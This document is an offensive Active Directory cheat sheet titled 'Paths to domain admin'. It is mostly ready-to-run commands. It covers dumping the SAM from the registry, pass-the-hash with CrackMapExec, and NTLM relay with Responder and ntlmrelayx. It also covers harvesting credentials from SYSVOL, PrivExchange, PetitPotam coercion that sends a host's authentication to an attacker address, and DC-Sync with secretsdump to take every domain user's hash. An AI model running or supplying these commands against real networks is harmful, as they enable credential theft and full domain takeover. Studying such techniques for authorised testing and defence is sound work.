# Paths to domain admin

## DNS Recon
```
dnsrecon -r myADNetworkSubnet -n myDomainControllerIP
```

## Null Session
```shell
cme smb yourTargetIP -u '' -p ''
```

## Pass-The-Hash
Pass-The-Hash (PTH) can be done with NTLM hashes. NTLM hashes are stored in the Security Account Manager (SAM) database and in Domain Controller's NTDS.dit database. They look like this: `aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42`. Contrary to what you'd expect, the LM hash is the one before the semicolon and the NT hash is the one after the semicolon.

From a pentesting perspective:

- You **CAN** perform Pass-The-Hash attacks with NTLM hashes.
- You **CANNOT** perform Pass-The-Hash attacks with Net-NTLM hashes.

You get NTLM hashes when dumping the SAM database of any Windows OS, a Domain Controller's NTDS.dit database or from Mimikatz (Fun fact, although you can't get clear-text passwords from Mimikatz on Windows >= 8.1 you can get NTLM hashes from memory). Some tools just give you the NT hash (e.g. Mimikatz) and that's perfectly fine: obviously you can still Pass-The-Hash with just the NT hash.

### Dump SAM & Retrieve NTLM hashes
#### Dump via registry key
```shell
reg save hklm\sam C:\sam.reg
reg save hklm\system C:\system.reg
```

#### Retrieve hashes with both files
```shell
samdump2 system.reg sam.reg
```

### Perform Pass-The-Hash
```shell
cme smb yourTargetIP -u Administrator -H LMHASH:NTHASH --local-auth
```

## NTLM Relay
Relay can be done with Net-NTLMv1 (NTLMv1) and Net-NTLMv2 (NTLMv2) hashes.

Since `MS08-068` you cannot relay a Net-NTLM hash back to the same machine you got it from (e.g. the 'reflective' attack) unless you're performing a cross-protocol relay (which is an entirely different topic). However you can still relay the hash to another machine.

**TL;DR you don't have to crack the hashes you get from Responder, you can directly relay them to other machines!**

What's really cool about this? You can use Responder in combination with a relay tool to automatically intercept connections and relay authentication hashes!

The only caveat to this attack? SMB Signing needs to be disabled on the machine you're relaying too. With the exception of Windows Server OS's, all Windows operating systems have SMB Signing disabled by default.

Personally, I consider SMB Signing to be one of the most overlooked and underrated security settings in Windows specifically because of this attack and how easy it allows for attackers to gain an initial foothold.

### References
- [Peter Gombos - LM, NTLM, Net-NTLMv2, oh my!](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4)
- [byt3bl33d3r - Practical guide to NTLM Relaying in 2017 (A.K.A getting a foothold in under 5 minutes)](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
  
### Active Directory Certificate Services
2 services in AD-CS are vulnerable to NTLM Relay:

1. CA Web Enrollment
2. Certificate Enrollment Web Service

With (privileged) access through NTLM Relay to these services, an attacker can request a new certificate and obtain *persistent* privileged access to other services & resources under the form of a certificate (which can be transformed in a Kerberos TGT with tools such as `kekeo` ).

### Generate list of potential target (Machine with SMB Signing disabled)
```shell
cme --timeout 3 smb 10.10.18.0/24 --gen-relay-list targets-10.10.16.0_24.txt
```

```shell
#/usr/bin/bash
functions=$(cat active-subnets.txt)
for function in $functions; do \
    cme --timeout 3 smb $function/24 --gen-relay-list targets-$function-24.txt & \
done;
```

### Relay hashes gathered from Responder
Before that, change `Responder.conf` to match the following:

```
[Responder Core]

; Servers to start
SQL = On
SMB = Off     # Turn this off
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = Off    # Turn this off
HTTPS = On
DNS = On
LDAP = On
```

In one terminal have `ntlmrelayx.py` ready to relay connections
```shell
sudo ntlmrelayx.py -smb2support -tf smb-relay-targets.txt
```

in another console, have `responder` MiTMing Windows host by poisoning LLMNR/NBT-NS
```shell
sudo responder -I myNetworkInterface -wrfd
```

## Credentials in SYSVOL

### Metasploit

```shell
use auxiliary/scanner/smb/smb_enum_gpp
set rhosts <DC1>
set SMBUser myUser
set SMBPass myPass
run
```

### Manually
```shell
sudo mount -t cifs //10.10.10.1/SYSVOL /mnt -o username=myUser,password=myPass
```

## Enumerate Samba related information and rid

### enum4linux
```shell
enum4linux -a -u "myDomain\myUser" -p "myPassword" 10.220.2.9 | tee enum4linux.scan
```

### rpcclient
```shell
rpcclient -U "FR/NCB762" 10.220.2.9 -c "enumdomusers"
```

## PrivExchange
```shell
python privexchange.py -ah dev.myDomain.local myVulnerableExchangeServer.myDomain.local -u myUser -d myDomain.local
```
```shell
sudo ntlmrelayx.py -t myDomainController --escalate-user myUser
```

## PetitPotam
Attack starts when an unauthenticated (No domain credentials needed) attacker triggers a (potentially privileged) Windows host to authenticate to the attacker's host. They does it by requesting `EFS-RPC - Encrypted File System service` - to open a remote file on their own machine. Technically speaking, the attacker invokes `EfsRpcOpenFileRaw`, specifying a file path that points to their remote machine: `\\<attacker_address>\test\Settings.ini`.

Next, the attacker can perform an NTLM Relay attack (i.e. against AD-CS (Active Directory Certificate Services) and "impersonates" the victim machine. 
This part is based on `@SpecterOps` findings (ESC8 in https://posts.specterops.io/certified-pre-owned-d95910965cd2) and isn't PetitPotam-specific.

### Confirming the vulnerability
You can check if the host is really vulnerable by starting Responder to collect the incoming hash (Hash comes over SMB, so make sure to have SMB server enabled in your `Responder.conf`)

```shell
sudo responder -I myNetworkInterface  
```

Then, executes the `PetitPotam.py` script taken from [here](https://github.com/topotam/PetitPotam)
```shell
python3 PetitPotam.py attackerIPAddress targetIPAddress
```
If vulnerable, you should receive the stolen hash in your Responder console.

### Identify ADCS server
#### From Windows
```shell
certutil –config – -ping
```

#### From Linux
```shell
???
```

### Check if LDAP signing is required

Can be done with: https://github.com/Rcarnus/ldap-scanner
```shell
python3 ldap-scanner.py myUser@myDomainController
```

### References
- [Sprocket Security - The ultimate tag team: PetitPotam and ADCS pwnage from Linux](https://www.sprocketsecurity.com/blog/the-ultimate-tag-team-petitpotam-and-adcs-pwnage-from-linux)

## SIGRed (CVE-2020-1350) 
SIGRed (CVE-2020-1350) is a wormable, critical vulnerability (CVSS base score of 10.0) in the Windows DNS server that affects Windows Server versions 2003 to 2019, and can be triggered by a malicious DNS response. As the service is running in elevated privileges (SYSTEM), if exploited successfully, an attacker is granted Domain Administrator rights, effectively compromising the entire corporate infrastructure. 

#### References
- [Checkpoint Research - SIGRed – Resolving Your Way into Domain Admin: Exploiting a 17 Year-old Bug in Windows DNS Servers](https://research.checkpoint.com/2020/resolving-your-way-into-domain-admin-exploiting-a-17-year-old-bug-in-windows-dns-servers/)
- [Youtube Demo](https://youtu.be/PUlMmhD5it8)
- [Grapl - Anatomy of an exploit: RCE with CVE-2020-1350-SIGRed](https://www.graplsecurity.com/post/anatomy-of-an-exploit-rce-with-cve-2020-1350-sigred)
- [Michael Ritter - Offensice AD 101](https://owasp.org/www-pdf-archive/OWASP_FFM_41_OffensiveActiveDirectory_101_MichaelRitter.pdf)


## DC-Sync
Once you are domain admin, you can retrieve all domain users NTLM hashes from Domain controllers using the following commands:

```
python3 secretsdump.py myDomain/myDomainUser@myDomainController -just-dc-ntlm > hashes.dump
```